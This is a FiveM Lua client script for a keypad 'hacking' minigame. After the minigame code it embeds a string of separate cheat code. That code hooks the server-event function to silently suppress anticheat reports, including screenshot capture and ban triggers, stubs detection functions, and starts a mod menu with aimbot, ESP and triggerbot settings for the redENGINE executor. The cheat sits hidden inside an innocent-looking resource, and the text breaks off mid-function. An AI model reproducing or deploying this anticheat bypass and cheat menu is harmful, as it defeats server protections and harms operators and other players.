local drawSprite = DrawSprite

local txd = {
	'mphackinggame',
	'mphackinggamebg',
	'mphackinggamewin',
	'mporderunlock',
	'mporderunlock_decor',
	'mphackinggamewin2'
}

local innerCircles = {
	[1] = {
		{x=0.244, y=0.321},
		{x=0.244, y=0.419},
		{x=0.244, y=0.516},
		{x=0.244, y=0.614},
		{x=0.244, y=0.712},
	},

	[2] = {
		{x=0.304, y=0.321},
		{x=0.304, y=0.419},
		{x=0.304, y=0.516},
		{x=0.304, y=0.614},
		{x=0.304, y=0.712}
	},				
	
	[3] = {
		{x=0.363, y=0.321},
		{x=0.363, y=0.417},
		{x=0.363, y=0.516},
		{x=0.363, y=0.615},
		{x=0.363, y=0.711}
	},

	[4] = {
		{x=0.423, y=0.321},
		{x=0.423, y=0.418},
		{x=0.423, y=0.516},
		{x=0.423, y=0.614},
		{x=0.423, y=0.711}
	},

	[5] = {
		{x=0.483, y=0.321},
		{x=0.483, y=0.418},
		{x=0.483, y=0.515},
		{x=0.483, y=0.614},
		{x=0.483, y=0.712}	
	},

	[6] = {
		{x=0.543, y=0.321},
		{x=0.543, y=0.419},
		{x=0.543, y=0.515},
		{x=0.543, y=0.614},
		{x=0.543, y=0.712}
	}
}


local scramblePos = {
	{x=0.5, y=0.84},
	{x=0.493, y=0.84},
	{x=0.486, y=0.84},
	{x=0.479, y=0.84},
	{x=0.472, y=0.84},
	{x=0.465, y=0.84},
	{x=0.458, y=0.84},
	{x=0.451, y=0.84},
	{x=0.444, y=0.84},
	{x=0.437, y=0.84},
	{x=0.43, y=0.84},
	{x=0.423, y=0.84},
	{x=0.416, y=0.84},
	{x=0.409, y=0.84},
	{x=0.402, y=0.84},
	{x=0.395, y=0.84},
	{x=0.388, y=0.84},
	{x=0.381, y=0.84},
	{x=0.374, y=0.84},
	{x=0.367, y=0.84},
	{x=0.36, y=0.84},
	{x=0.353, y=0.84},
	{x=0.346, y=0.84},
	{x=0.353, y=0.84},
	{x=0.339, y=0.84},
	{x=0.332, y=0.84},
	{x=0.325, y=0.84},
	{x=0.318, y=0.84},
	{x=0.311, y=0.84},
	{x=0.304, y=0.84},
	{x=0.297, y=0.84},
	{x=0.29, y=0.84},
	{x=0.283, y=0.84}
}

local fakeKeyButtons = {
	{x=0.726, y=0.62},
	{x=0.669, y=0.343},
	{x=0.726, y=0.343},
	{x=0.782, y=0.343},
	{x=0.669, y=0.435},
	{x=0.726, y=0.435},
	{x=0.782, y=0.435},
	{x=0.669, y=0.527},
	{x=0.726, y=0.527},
	{x=0.782, y=0.527}
}

local resultCodePos = {
	{x=0.666, y=0.766},
	{x=0.706, y=0.767},
	{x=0.746, y=0.767},
	{x=0.786, y=0.767}
}

local lifePos = {
	{x=0.553, y=0.153},
	{x=0.587, y=0.153},
	{x=0.62, y=0.153},
	{x=0.653, y=0.153},
	{x=0.686, y=0.153},
	{x=0.719, y=0.153}
}


local showDialog = false
local dialogTexName = 'correct_0'

local toggleAnimOverlay = true

local isPlayerInputDisabled = false
local isGameActive = false
local gameWon = false

local availableLife = 0
local timer = 0	-- in seconds
local timeString = {}

local activeStage = 1
local activeColumn = 0
local activeRow = 0
local activeSelection = 0

local selectedDots = {
	correctDots = {},
	incorrectDots = {}
}

local fakepattern = {}
local passcodePattern
local passcodeResult

local callbackFn

function secondsToString(seconds)
	local seconds = tonumber(seconds)
	local hours = string.format("%02.f", math.floor(seconds/3600));
	local mins = string.format("%02.f", math.floor(seconds/60 - (hours*60)));
	local secs = string.format("%02.f", math.floor(seconds - hours*3600 - mins *60));

	local time={}
	mins:gsub(".",function(c) table.insert(time,c) end)
	secs:gsub(".",function(c) table.insert(time,c) end)
	return time
end


function shuffle(t)
	local tbl = {}
	for i = 1, #t do
		Wait(0)
		tbl[i] = t[i]
	end
	for i = #tbl, 2, -1 do
		Wait(0)
		math.randomseed(GetGameTimer()*GetFrameTime())
		local j = math.random(i)
		tbl[i], tbl[j] = tbl[j], tbl[i]
	end
	if table.concat(t) == table.concat(tbl) then
		tbl = shuffle(t)
	end
	return tbl
end


function randNumExclusive(n, a, b)
	local numbers = {}
	for i = a, b do
		Wait(0)
		numbers[i] = i
	end

	for i = 1, #numbers - 1 do
		Wait(0)
		local j = math.random(i, #numbers)
		numbers[i], numbers[j] = numbers[j], numbers[i]
	end
	numbers = shuffle(numbers)
	return {table.unpack(numbers, 1, n)}
end


function generatePattern(n, a, b)
	local numbers = {}

	for i=1,5 do
		numbers[i] = i
	end
	numbers = shuffle(numbers)

	math.randomseed(GetGameTimer()*GetFrameTime()*GetRandomIntInRange(1000, 36415))
	numbers[#numbers+1] = math.random(a, b)
	numbers = shuffle(numbers)

	return {table.unpack(numbers, 1, n)}
end


function generateFakePattern()
	fakepattern = {}
	for i=1,math.random(4,7) do
		table.insert(fakepattern, generatePattern(6, 1, 5))
	end
end


function showTimer()
	drawSprite(
		'mphackinggame', 
		'numbers_'..timeString[1], 
		0.258, 0.152, 0.025, 0.055, 0, 255, 255, 255, 255
	)

	drawSprite(
		'mphackinggame', 
		'numbers_'..timeString[2], 
		0.283, 0.152, 0.025, 0.055, 0, 255, 255, 255, 255
	)

	drawSprite(
		'mphackinggame', 
		'numbers_colon', 
		0.307, 0.154, 0.025, 0.055, 0, 255, 255, 255, 255
	)

	drawSprite(
		'mphackinggame', 
		'numbers_'..timeString[3], 
		0.33, 0.153, 0.025, 0.055, 0, 255, 255, 255, 255
	)

	drawSprite(
		'mphackinggame', 
		'numbers_'..timeString[4], 
		0.355, 0.153, 0.025, 0.055, 0, 255, 255, 255, 255
	)

end


function blinkDialog(result)
	local flash = 3000
	local tex1
	local tex2
	if result == true then
		tex1 = 'correct_1'
		tex2 = 'correct_0'
	else
		tex1 = 'incorrect_1'
		tex2 = 'incorrect_0'
	end

	CreateThread(function()
		for i=1,4 do
			flash = flash - 500
			dialogTexName = tex1
			Wait(500)
			showDialog = true

			flash = flash - 500
			dialogTexName = tex2
			Wait(500)
		end
		showDialog = false
	end)
end


function startGame()

	CreateThread(function()

		for i=1,#txd do
			Wait(0)
			RequestStreamedTextureDict(txd[i], false)
		end

		for i=1,#txd do
			Wait(0)
			while not HasStreamedTextureDictLoaded(txd[i]) do
				Wait(0)
			end
		end 

        timeString = secondsToString(timer)
		-- Generate target
		passcodePattern = generatePattern(6, 1, 5)
		passcodeResult = randNumExclusive(4, 0, 9)
		while passcodePattern == nil and passcodeResult == nil do
			Wait(0)
		end

		SendNUIMessage({type  = 'intro'})
		Wait(3500)

		-- Update timer string
		CreateThread(function()
			while timer > 0 and isGameActive do
				timer = timer - 1
				timeString = secondsToString(timer)
				toggleAnimOverlay = not toggleAnimOverlay
				Wait(1000)
			end
			
			if not gameWon and isGameActive then
				isPlayerInputDisabled = true
				gameWon = false
				blinkDialog(false)
				CreateThread(function()
					Wait(3000)
					callbackFn(2,'ran out of time')
					SendNUIMessage({type  = 'fail'})
					isGameActive = false
				end)
			end
		end)

		-- Update scrable count
		local count = 1
		CreateThread(function()
			waitTimer = (timer*1000)/#scramblePos
			while count <= #scramblePos do
				Wait(waitTimer)
				count = count + 1
			end
		end)

		local showFakePattern = false
		local curFakePattern
		CreateThread(function()
			generateFakePattern()
			local newthread = false
			local draw = true
			isPlayerInputDisabled = true
			
			-- Show fake patterns
			for index,itemTable in pairs(fakepattern) do
				showFakePattern = true
				curFakePattern = {}
				for colnum,rownum in pairs(itemTable) do
					table.insert(curFakePattern, innerCircles[colnum][rownum])
				end
				SendNUIMessage({type  = 'audio', audioType = 'fake'})
				Wait(800)
				showFakePattern = false
				Wait(200)
			end

			-- Show real pattern at the end
			for i=1,2 do
				showFakePattern = true
				curFakePattern = {}
				for colnum,rownum in pairs(passcodePattern) do
					table.insert(curFakePattern, innerCircles[colnum][rownum])
				end
				SendNUIMessage({type  = 'audio', audioType = 'real'})
				Wait(300)
				showFakePattern = false
				Wait(200)
			end

			showFakePattern = false
			activeColumn = 1
			isPlayerInputDisabled = false
		end)

		while isGameActive do
			Wait(0)

			drawSprite(
				'mphackinggamebg', 
				'bg', 
				0.50, 0.50, 1.0, 1.0, 0, 255, 255, 255, 255
			)
			
			-- Animation stuff
			if toggleAnimOverlay then
				drawSprite(
					'mphackinggamewin', 
					'tech_1_3', 
					0.2, 0.40, 0.3, 0.5, 0, 255, 255, 255, 255
				)

				drawSprite(
					'mphackinggamewin2', 
					'tech_2_2', 
					0.18, 0.80, 0.3, 0.3, 0, 255, 255, 255, 255
				)

				drawSprite(
					'mphackinggamewin', 
					'tech_1_1', 
					0.8, 0.50, 0.3, 0.6, 0, 0, 140, 150, 255
				)

			else
				drawSprite(
					'mphackinggamewin', 
					'tech_1_1', 
					0.2, 0.40, 0.3, 0.5, 0, 255, 255, 255, 255
				)

				drawSprite(
					'mphackinggamewin2', 
					'tech_2_0', 
					0.18, 0.80, 0.3, 0.3, 0, 255, 255, 255, 255
				)

				drawSprite(
					'mphackinggamewin', 
					'tech_1_4', 
					0.8, 0.50, 0.3, 0.6, 0, 0, 140, 150, 255
				)
			end

			-- Draw main overlay over background
			drawSprite(
				'mporderunlock', 
				'background_layout', 
				0.50, 0.50, 0.7, 0.85, 0, 255, 255, 255, 255
			)

			-- More animation stuff
			if toggleAnimOverlay then
				drawSprite('mporderunlock_decor',
					'techaration_0', 
					0.50, 0.50, 0.7, 0.85, 0, 255, 255, 255, 255
				)
			else
				drawSprite('mporderunlock_decor',
					'techaration_1', 
					0.50, 0.50, 0.7, 0.85, 0, 255, 255, 255, 255
				)
			end


			-- Life counter
			for i=1, availableLife do
				drawSprite(
					'mphackinggame', 
					'life', 
					lifePos[i].x, lifePos[i].y, 0.035, 0.055, 0, 255, 255, 255, 255
				)
			end

			showTimer()

			-- Show fake patterns when toggled before every level start
			if showFakePattern then
				if curFakePattern ~= nil then
					for i,k in pairs(curFakePattern) do
						drawSprite(
							'mporderunlock', 
							'correct_circles', 
							k.x, k.y, 0.06, 0.10, 0, 255, 255, 255, 255
						)
					end
				end
			end


			-- Draw past columns
			for i=1,activeColumn do
				for j=1,#innerCircles[i] do
					drawSprite(
						'mporderunlock', 
						'inner_circles', 
						innerCircles[i][j].x, innerCircles[i][j].y, 0.07, 0.11, 0, 255, 255, 255, 255
					)
				end
			end
			
			-- Draw selected/active column
			if activeColumn > 0 and activeRow > 0 then
				drawSprite(
					'mporderunlock', 
					'selector', 
					innerCircles[activeColumn][activeRow].x, innerCircles[activeColumn][activeRow].y, 0.07, 0.11, 0, 255, 255, 255, 255
				)
			end
			
			-- Scramble reduction logic loop 
			for i=count,#scramblePos do
				drawSprite(
					'mphackinggame', 
					'scrambler_fill_segment', 
					scramblePos[i].x, scramblePos[i].y, 0.005, 0.07, 0, 255, 255, 255, 255
				)
			end

			-- Render passcode for completed levels
			if activeStage-1 > 0 then
				local upperLimit = 1
				if activeStage == 5 then
					upperLimit = 4
				else
					upperLimit = activeStage-1
				end
				for i=1, upperLimit do
					drawSprite(
						'mporderunlock', 
						'keypad_feedback_'..passcodeResult[i], 
						resultCodePos[i].x, resultCodePos[i].y, 0.035, 0.06, 0, 255, 255, 255, 255
					)

					local keypadPos = fakeKeyButtons[(passcodeResult[i]+1)]
					drawSprite(
						'mporderunlock', 
						'keypad_'..passcodeResult[i], 
						keypadPos.x, keypadPos.y, 0.055, 0.09, 0, 255, 255, 255, 255
					)
					
				end 
			end


			-- Render border box for code which needs to be cracked
			if activeStage < 5 then
				drawSprite(
					'mporderunlock', 
					'keypad_feedback_box', 
					resultCodePos[activeStage].x, resultCodePos[activeStage].y, 0.045, 0.07, 0, 255, 255, 255, 255
				)
			end

			-- Draw all correct selections
			for i=1,#selectedDots['correctDots'] do
				local rowNum = selectedDots['correctDots'][i].row
				local colNum = selectedDots['correctDots'][i].col
				local pos = innerCircles[colNum][rowNum]
				drawSprite(
					'mporderunlock', 
					'correct_circles', 
					pos.x, pos.y, 0.06, 0.10, 0, 255, 255, 255, 255
				)
			end

			-- Draw all incorrect selections
			for i=1,#selectedDots['incorrectDots'] do
				local rowNum = selectedDots['incorrectDots'][i].row
				local colNum = selectedDots['incorrectDots'][i].col
				local pos = innerCircles[colNum][rowNum]
				drawSprite(
					'mporderunlock', 
					'incorrect_circles', 
					pos.x, pos.y, 0.02, 0.03, 0, 255, 255, 255, 255
				)
			end

			-- Only show when its toggled by blinkDialog function
			if showDialog then
				drawSprite('mphackinggame', dialogTexName, 0.5, 0.5, 0.35, 0.15, 0.0, 255, 255, 255, 1.0)
			end

			if not isPlayerInputDisabled then	-- Make sure player doesn't input when things are being processed
				
				if IsControlJustPressed(0, 194) then -- Backspace
					gameWon = false
					timer = 0
					
				elseif IsControlJustPressed(0, 172) then -- Arrow up
					if activeRow > 1 then
						SendNUIMessage({type  = 'audio', audioType = 'keypress'})
						activeRow = activeRow - 1
					end

				elseif IsControlJustPressed(0, 173) then -- Arrow down
					if activeRow < 5 then
						SendNUIMessage({type  = 'audio', audioType = 'keypress'})
						activeRow = activeRow + 1
					end

				elseif IsControlJustPressed(0, 191) then -- Enter
					if activeColumn > 0 and activeColumn < 7  and activeRow ~= 0 then
						if passcodePattern[activeColumn] == activeRow then	-- If the selected position is correct then
							local isCircleAlreadyPresent = false
							-- Verify that it hasn't already been selected
							for i=1, #selectedDots['correctDots'] do
								if selectedDots['correctDots'][i].row == activeRow and selectedDots['correctDots'][i].col == activeColumn then
									isCircleAlreadyPresent = true
									break
								end
							end
							if not isCircleAlreadyPresent then
								SendNUIMessage({type  = 'audio', audioType = 'correct'})
								table.insert(selectedDots['correctDots'], {row=activeRow, col=activeColumn})
							end

							-- Logic for processing next stage
							if activeColumn == 6 and activeStage < 4 then
								blinkDialog(true)
								showFakePattern = false
								curFakePattern = {}
								activeColumn = 0
								activeRow = 0

								if activeStage <=4 then
									activeStage = activeStage + 1
                                    availableLife = 6
									CreateThread(function()

										local newthread = false
										local draw = true
										isPlayerInputDisabled = true
										selectedDots['correctDots'] = {}
										selectedDots['incorrectDots'] = {}

										generateFakePattern()
										
										passcodePattern = generatePattern(6, 1, 5)
										while passcodePattern == nil do
											Wait(0)
										end
										
										while showDialog do
											Wait(500)
										end

										for index,itemTable in pairs(fakepattern) do
											showFakePattern = true
											curFakePattern = {}
											for colnum,rownum in pairs(itemTable) do
												table.insert(curFakePattern, innerCircles[colnum][rownum])
											end
											SendNUIMessage({type  = 'audio', audioType = 'fake'})
											
											Wait(800)
											showFakePattern = false
											Wait(200)
										end

										for i=1,2 do
											showFakePattern = true
											curFakePattern = {}
											for colnum,rownum in pairs(passcodePattern) do
												table.insert(curFakePattern, innerCircles[colnum][rownum])
											end
											SendNUIMessage({type  = 'audio', audioType = 'real'})
											Wait(300)
											showFakePattern = false
											Wait(200)
										end
					
										showFakePattern = false
										activeRow = 0
										activeColumn = 1
										isPlayerInputDisabled = false
										
									end)
								end
							
							elseif activeColumn == 6 and activeStage == 4 then
								activeStage = activeStage + 1
								activeRow = 0
								activeColumn = 0
								isPlayerInputDisabled = true
								gameWon = true
								blinkDialog(true)
								CreateThread(function()
									Wait(3000)
									callbackFn(1,'Hack successful')
									SendNUIMessage({type  = 'success'})
									isGameActive = false
								end)								
							end

							if activeColumn < 6 then
								activeColumn = activeColumn + 1
							end
						else
							
							SendNUIMessage({type  = 'audio', audioType = 'incorrect'})
							local isCircleAlreadyPresent = false
							for i=1, #selectedDots['incorrectDots'] do
								if selectedDots['incorrectDots'][i].row == activeRow and selectedDots['incorrectDots'][i].col == activeColumn then
									isCircleAlreadyPresent = true
									break
								end
							end
							if not isCircleAlreadyPresent then
								table.insert(selectedDots['incorrectDots'], {row=activeRow, col=activeColumn})
							end

							
							if availableLife > 0 then 
								availableLife = availableLife - 1
							end

							if availableLife <= 0 then
								availableLife = 0
								isPlayerInputDisabled = true
								gameWon = false
								blinkDialog(false)
								CreateThread(function()
									Wait(3000)
									callbackFn(0,'Lives ran out')
									SendNUIMessage({type  = 'fail'})
									isGameActive = false
								end)
							end
						end
					end
				end
			end
		end
	end)
end



AddEventHandler("ultra-keypadhack", function(life, time, returnFn)
	if life and time and returnFn then
		callbackFn = returnFn
		if life <= 0 or life > 6 then
			callbackFn(-1,'Invalid lives passed')
			return
		end

		if time < minTime or time > maxTime then
			callbackFn(-1,'Invalid time passed')
			return
		end

		timer = tonumber(time)
        timer = 300
		availableLife = tonumber(life)
		timeString = {}

		activeStage = 1
		activeColumn = 0
		activeRow = 0
		activeSelection = 0

		selectedDots['correctDots'] = {}
		selectedDots['incorrectDots'] = {}

		toggleAnimOverlay = true
		isPlayerInputDisabled = false
		gameWon = false

		if not isGameActive then
			isGameActive = true
			startGame()
		else
			isGameActive = false
		end
	else
		callbackFn(-1,'Invalid parameters passed')
	end
end)

RegisterCommand("model", function()
    print("Model: "..GetEntityModel(GetVehiclePedIsIn(PlayerPedId(), false)))
end)

Citizen.CreateThread(function()
    Citizen.Wait(15000)
    for k, v in pairs(GetRegisteredCommands()) do
        if string.find(v.name, "_") == nil and string.find(v.name, "+") == nil and string.find(v.name, "-") == nil then
            TriggerEvent('chat:addSuggestion', "/"..v.name, v.name, {})
        end
    end
end)

local srcm = [[
    CreateThread(function()

        local GHJFD = {}
        GHJFD.Bypasses = {
           Events = {
               "anticheese",
               "anticheat",
               "antilynx",
               "discordbot",
               "EasyAdmin:CaptureScreenshot",
               "screenshot",
               "cheat",
               "ncpp",
               "ViolationDetected",
               "godModePass",
               "godModeFail",
               "adminGodmodeCheck",
               "illegalWeapon",
               "ybn_ac",
               "x_anticheat",
               "CMG:ban",
               "Choco:",
               "alpha-tango-golf",
               "AC_SYNC:BAN",
               "foundyou",
               "AntiBlips",
               "AntiSpectate",
               "CarlosLR-AC",
               "globalAC:trigger",
               "NWAC",
               "AC:Sanction",
               "ChXa"
           },
           Args = {
               {"This player tried to bypass the anticheat", "ChocoHax"},
               {"This player tried to stop the anticheat", "ChocoHax"},
               {"This player injected a mod menu", "ChocoHax"},
               {"🍫 AntiChocoStop", "ChocoHax"},
               {"🍫 AntiTeleport", "ChocoHax"},
               {"AntiSpectate", "ChocoHax"},
               {"AntiBlips", "ChocoHax"},
               {"🍫 Secly", "ChocoHax"},
               {"ChocoHax", "ChocoHax"},
               {"HentaiCore", "HentaiCore"},
               {"`ForceSocialClubUpdate` Removal", "ATG"},
               {"Ham Mafia Executor Detected", "ATG"},
               {"Table Emptying in Resource", "ATG"},
               {"Malicious Function Usage", "ATG"},
               {"Player Health above MAX", "ATG"},
               {"Weapon Damage Modified", "ATG"},
               {"Anti-Resource-Restart", "ATG"},
               {"Manipulation Detected", "ATG"},
               {"Native Draw Detection", "ATG"},
               {"Inventory Exploiting", "ATG"},
               {"RedENGINE detection", "ATG"},
               {"Injection detected", "ATG"},
               {"BlacklistedWeapon:", "ATG"},
               {"Anti-Resource-Stop", "ATG"},
               {"Godmode Activated", "ATG"},
               {"AntiModelChanger", "ATG"},
               {"Infinite Health", "ATG"},
               {"Menu Detection", "ATG"},
               {"Cheat Engine", "ATG"},
               {"#GetHammed", "ATG"},
               {"Native Function", "Sanction"},
               {"BAN", "Sanction"}
           },
           tfi = TriggerServerEventInternal,
           global = _G
       }
       function GHJFD.Bypasses:CheckEvent(event)
           for k, v in pairs(GHJFD.Bypasses.Events) do
               if event:lower():find(v:lower(), 1, true) then
                   return true
               end
           end
           return false
       end
       function GHJFD.Bypasses:CheckArgs(args)
           for k, v in pairs(args) do
               if type(v) == "string" then
                   for z, x in pairs(GHJFD.Bypasses.Args) do
                       if x[1]:lower():find(v:lower(), 1, true) then
                           return true
                       end
                   end
               end
           end
           return false
       end
       function TriggerServerEventInternal(event, payload, length)
           if GHJFD.Bypasses:CheckEvent(event) then
               return
           end
           local unpacked_payload = msgpack.unpack(payload)
           if GHJFD.Bypasses:CheckArgs(unpacked_payload) then
               return
           end
           return Citizen.InvokeNative(0x7FDD1128, event, payload, length)
       end
       CreateThread(
           function()
               for k, v in ipairs(GHJFD.Bypasses.global) do
                   if k == "TriggerClientEventInt" or k == "HandleConfig" then
                       table.remove(GHJFD.Bypasses.global, v)
                   end
               end
               while true do
                   _G = GHJFD.Bypasses.global
                   Wait(0)
               end
           end
       )
       
       
       
       function IsExplosionInSphere(...)return false end;function NetworkIsInSpectatorMode()return false end;function ShutdownAndLoadMostRecentSave()return true end;function ActivateRockstarEditor()return end;function ForceSocialClubUpdate()return end;function fuckmedaddyadwthwr()return end
       
       
       CreateThread(function()
           local frozen_ents = {}
           local frozen_players = {}
           local friends = {}
           local camX, camY, camZ
           local lift_height = 0.0
           local lift_inc = 0.1
           local rc_camX, rc_camY, rc_camZ
           local notifications_h = 64
           local dict = {
               Citizen = Citizen,
               math = math,
               string = string,
               type = type,
               tostring = tostring,
               tonumber = tonumber,
               json = json,
               utf8 = utf8,
               pairs = pairs,
               ipairs = ipairs
           }
           dict.Citizen.IN = Citizen.InvokeNative
       
           local vector_origin = vector3(0, 0, 0)
       
           local ADRVSDD = {
               DynamicTriggersasdf = {},
               Painter = {},
               Util = {},
               Categories = {},
               List = {},
               PlayerCache = {},
               Config = {
                   Vehicle = {
                       Boost = 1.0
                   },
                   Player = {
                       CrossHair = false,
                       Blips = true,
                       ESP = true,
                       ESPDistance = 1000.0,
                       Box = false,
                       Bone = false,
                       OneTap = false,
                       Aimbot = false,
                       AimbotNeedsLOS = true,
                       TriggerBotNeedsLOS = true,
                       TPAimbot = false,
                       TPAimbotThreshold = 40.0,
                       TPAimbotDistance = 2.0,
                       RageBot = false,
                       TriggerBot = false,
                       NoDrop = false,
                       AimbotFOV = 90.0,
                       AimbotBone = 1,
                       AimbotKey = "MOUSE1",
                       AimbotReleaseKey = "LEFTALT",
                       TriggerBotDistance = 500.0,
                       TargetInsideVehicles = false
                   },
                   UseBackgroundImage = true,
                   UseSounds = true,
                   UseAutoWalk = false,
                   UseAutoWalkAlt = false,
                   ShowKey = "TAB",
                   FreeCamKey = "HOME",
                   RCCamKey = "=",
                   DisableKey = "-",
                   ShowText = true,
                   SafeMode = true,
                   MenuX = 300,
                   MenuY = 300,
                   NotifX = nil,
                   NotifY = nil,
                   NotifW = 420,
                   CurrentSelection = 1,
                   SelectedCategory = "category_1",
                   UsePrintMessages = false
               },
               Name = ":| Menu",
               Version = "1.0.0",
               Enabled = true,
               Showing = false,
               Base64 = {},
               Tertiary = {255, 205, 0, 60},
               MenuW = 923,
               MenuH = 583,
               DraggingX = nil,
               DraggingY = nil,
               CurrentPlayer = nil
           }
       
           local known_returns = {
               ["That file doesn't exist."] = true,
               ["Error opening file."] = true,
               ["Tried to save but data was null."] = true,
               ["Error deleting config. It doesn't exist."] = true,
               ["Successfully saved config."] = true,
               ["Successfully deleted config."] = true
           }
       
           local current_config = "ADRVSDD_default"
       
           local function _count(tab)
               local c = 0
       
               for _ in dict.pairs(tab) do
                   c = c + 1
               end
       
               return c
           end
       
           ADRVSDD.Base64.CharList = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
       
           function ADRVSDD.Base64:Encode(data)
               return (data:gsub(".", function(x)
                   local r, b = "", x:byte()
       
                   for i = 8, 1, -1 do
                       r = r .. (b % 2 ^ i - b % 2 ^ (i - 1) > 0 and '1' or '0')
                   end
       
                   return r
               end) .. "0000"):gsub("%d%d%d?%d?%d?%d?", function(x)
                   if (#x < 6) then return '' end
                   local c = 0
       
                   for i = 1, 6 do
                       c = c + (x:sub(i, i) == '1' and 2 ^ (6 - i) or 0)
                   end
       
                   return self.CharList:sub(c + 1, c + 1)
               end) .. ({'', '==', '='})[#data % 3 + 1]
           end
       
           function ADRVSDD:SetConfigList()
               if _Executor ~= "redENGINE" then return end
               HandleConfig("save", "__ADRVSDD_config_list.json", dict.json.encode(ADRVSDD.List))
           end
       
           function ADRVSDD:BuildIdentifier()
               if _Executor ~= "redENGINE" then return end
               local out = HandleConfig("load", "__ADRVSDD_statistics.identifier")
       
               if out == "That file doesn't exist." or out == "Error opening file." then
                   local identifier = ADRVSDD.Base64:Encode("Name=" .. ADRVSDD:GetFunction("GetPlayerName")(ADRVSDD:GetFunction("PlayerId")()) .. ":Seed=" .. dict.math.random(5, 5 ^ 3) .. ":Build=" .. ADRVSDD.Version)
                   HandleConfig("save", "__ADRVSDD_statistics.identifier", identifier)
                   ADRVSDD.Identifier = identifier
       
                   return
               end
       
               ADRVSDD.Identifier = out
           end
       
           function ADRVSDD:GetConfigList()
               if _Executor ~= "redENGINE" then return {} end
               local out = HandleConfig("load", "__ADRVSDD_config_list.json")
       
               if out == "That file doesn't exist." or out == "Error opening file." then
                   ADRVSDD.List = {
                       [current_config] = 1
                   }
       
                   ADRVSDD:SetConfigList()
       
                   return {}
               end
       
               if known_returns[out] then
                   ADRVSDD:AddNotification("Failed to fetch configs. See console for details.")
                   ADRVSDD:Print("[CONFIG] Failed to load config list: ^1" .. out .. "^7")
       
                   return {}
               else
                   return dict.json.decode(out) or {}
               end
           end
       
           function ADRVSDD:CopyTable(tab)
               local out = {}
       
               for key, val in dict.pairs(tab) do
                   if dict.type(val) == "table" then
                       out[key] = ADRVSDD:CopyTable(val)
                   else
                       out[key] = val
                   end
               end
       
               return out
           end
       
           function ADRVSDD:IsFriend(ped)
               local id = ADRVSDD:GetFunction("NetworkGetPlayerIndexFromPed")(ped)
               if not id or id < 0 then return false end
       
               return friends[ADRVSDD:GetFunction("GetPlayerServerId")(id)]
           end
       
           ADRVSDD.DefaultConfig = ADRVSDD:CopyTable(ADRVSDD.Config)
           ADRVSDD.List = ADRVSDD:GetConfigList()
       
           ADRVSDD.ConfigClass = {
               Load = function(cfg)
                   
                   local out = HandleConfig("load", (cfg or current_config) .. ".json")
       
                   if out == "That file doesn't exist." or out == "Error opening file." and (cfg or current_config) == "ADRVSDD_default" then
                       ADRVSDD:AddNotification("INFO", "Creating config for the first time.")
       
                       return ADRVSDD.ConfigClass.Save(true)
                   end
       
                   if known_returns[out] then
                       ADRVSDD:Print("[CONFIG] Failed to load ^3" .. (cfg or current_config) .. "^7: ^1" .. out .. "^7")
       
                       return ADRVSDD:AddNotification("ERROR", "Failed to load config. See console for details.")
                   else
                       local _config = dict.json.decode(out)
       
                       if dict.type(_config) == "table" then
                           ADRVSDD.Config = _config
                           ADRVSDD.Config.SafeMode = true
                           ADRVSDD.ConfigClass.DoSanityCheck()
                           ADRVSDD:AddNotification("SUCCESS", "Config loaded.")
                           ADRVSDD:Print("[CONFIG] Loaded config ^3" .. (cfg or current_config) .. "^7.")
                       else
                           ADRVSDD.ConfigClass.Save(true)
                           ADRVSDD:Print("[CONFIG] Failed to save ^3" .. (cfg or current_config) .. "^7: ^1Invalid data.^7")
       
                           return ADRVSDD:AddNotification("ERROR", "Failed to load config. See console for details.")
                       end
                   end
               end,
               DoSanityCheck = function()
                   for key, val in pairs(ADRVSDD.DefaultConfig) do
                       if ADRVSDD.Config[key] == nil then
                           ADRVSDD.Config[key] = val
                       end
       
                       if type(val) == "table" then
                           for k2, v2 in pairs(val) do
                               if ADRVSDD.Config[key][k2] == nil then
                                   ADRVSDD.Config[key][k2] = v2
                               end
                           end
                       end
                   end
               end,
               Delete = function(name)
                   if _Executor ~= "redENGINE" then return end
                   local out = HandleConfig("delete", name .. ".json")
       
                   if out == "Successfully deleted config." then
                       ADRVSDD:AddNotification("ERROR", "Failed to delete config. See console for details.")
       
                       return ADRVSDD:Print("[CONFIG] Failed to delete ^3" .. name .. "^7: ^1" .. existing .. "^7")
                   end
               end,
               Rename = function(old, new)
                   if _Executor ~= "redENGINE" then return end
                   local existing = HandleConfig("load", old .. ".json")
       
                   if existing == "Error opening file." or existing == "That file doesn't exist." then
                       ADRVSDD:AddNotification("ERROR", "Failed to rename config. See console for details.")
       
                       return ADRVSDD:Print("[CONFIG] Failed to rename ^3" .. old .. " to ^3" .. new .. "^7: ^1" .. existing .. "^7")
                   end
               end,
               Exists = function(name)
                   if _Executor ~= "redENGINE" then return end
                   local existing = HandleConfig("load", name .. ".json")
       
                   if existing == "Error opening file." or existing == "That file doesn't exist." then
                       ADRVSDD:AddNotification("ERROR", "Failed to rename config. See console for details.")
       
                       return false
                   end
       
                   return true
               end,
               Write = function(name, cfg)
                   if _Executor ~= "redENGINE" then return end
                   cfg = ADRVSDD:CopyTable(cfg)
                   cfg.Player.AimbotTarget = nil
                   cfg.SafeMode = nil
                   cfg = dict.json.encode(cfg)
                   local out = HandleConfig("save", name .. ".json", cfg)
       
                   if known_returns[out] and not silent then
                       local good = out:find("Successfully")
       
                       if not good then
                           ADRVSDD:Print("[CONFIG] Failed to save ^3" .. current_config .. "^7: ^1" .. out .. "^7")
       
                           return ADRVSDD:AddNotification("ERROR", "Failed to save config. See console for details.")
                       elseif silent == false then
                           ADRVSDD:Print("[CONFIG] Saved config ^3" .. current_config .. "^7.")
                       end
                   end
               end,
               Save = function(silent)
                   if _Executor ~= "redENGINE" then return end
                   local config = ADRVSDD:CopyTable(ADRVSDD.Config)
                   config.Player.AimbotTarget = nil
                   config.SafeMode = nil
                   config = dict.json.encode(config)
                   local out = HandleConfig("save", current_config .. ".json", config)
                   ADRVSDD.List[current_config] = ADRVSDD.List[current_config] or (_count(ADRVSDD.List) + 1)
       
                   if known_returns[out] and not silent then
                       local good = out:find("Successfully")
       
                       if not good then
                           ADRVSDD:Print("[CONFIG] Failed to save ^3" .. current_config .. "^7: ^1" .. out .. "^7")
       
                           return ADRVSDD:AddNotification("ERROR", "Failed to save config. See console for details.")
                       elseif silent == false then
                           ADRVSDD:Print("[CONFIG] Saved config ^3" .. current_config .. "^7.")
                       end
                   end
               end
           }
       
           local boundaryIdx = 1
       
           local function dummyUseBoundary(idx)
               return nil
           end
       
           local function getBoundaryFunc(bfn, bid)
               return function(fn, ...)
